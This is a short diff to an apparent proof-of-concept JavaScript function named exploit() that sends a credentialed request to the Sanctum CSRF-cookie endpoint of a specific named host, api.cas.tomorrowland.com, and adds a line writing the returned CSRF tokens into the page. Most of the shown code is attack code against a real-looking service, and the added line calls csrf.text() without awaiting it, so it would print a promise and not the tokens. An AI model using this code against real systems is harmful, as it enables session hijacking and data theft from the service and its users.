@@ -12,7 +12,7 @@
 async function exploit() {
 
   // Step 1: Initialize Sanctum session
-  await fetch("https://api.cas.tomorrowland.com/sanctum/csrf-cookie", {
+  const csrf = await fetch("https://api.cas.tomorrowland.com/sanctum/csrf-cookie", {
     method: "GET",
     credentials: "include",
     headers: {
@@ -43,6 +43,7 @@ async function exploit() {
   });
 
   // Display result in browser (for demo)
+  document.body.innerHTML += "<pre> CSRF tokens\n" + csrf.text() + "</pre>";
   document.body.innerHTML += "<pre>" + data + "</pre>";
 }
 
